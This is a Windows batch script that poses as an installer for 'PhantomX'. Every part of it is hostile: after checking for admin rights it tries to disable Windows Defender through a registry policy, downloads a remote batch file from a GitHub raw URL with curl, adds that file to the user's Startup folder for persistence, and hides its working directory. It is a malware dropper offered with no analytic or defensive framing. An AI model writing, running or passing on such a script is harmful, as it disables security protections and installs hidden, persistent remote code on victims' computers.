@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
echo Please run as administrator to install PhantomX
pause
exit
)
New-ItemProperty -Path "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -PropertyType String -Value "1"
md "C:\bean"
cd "C:\bean"
curl -o f.bat https://raw.githubusercontent.com/petergriuffin123/565/refs/heads/main/fe.bat
timeout 1 >nul
set "t=C:\bean\f.bat"
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\f.lnk"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%s%'); $s.TargetPath='%t%'; $s.Save()"
attrib +h "C:\bean"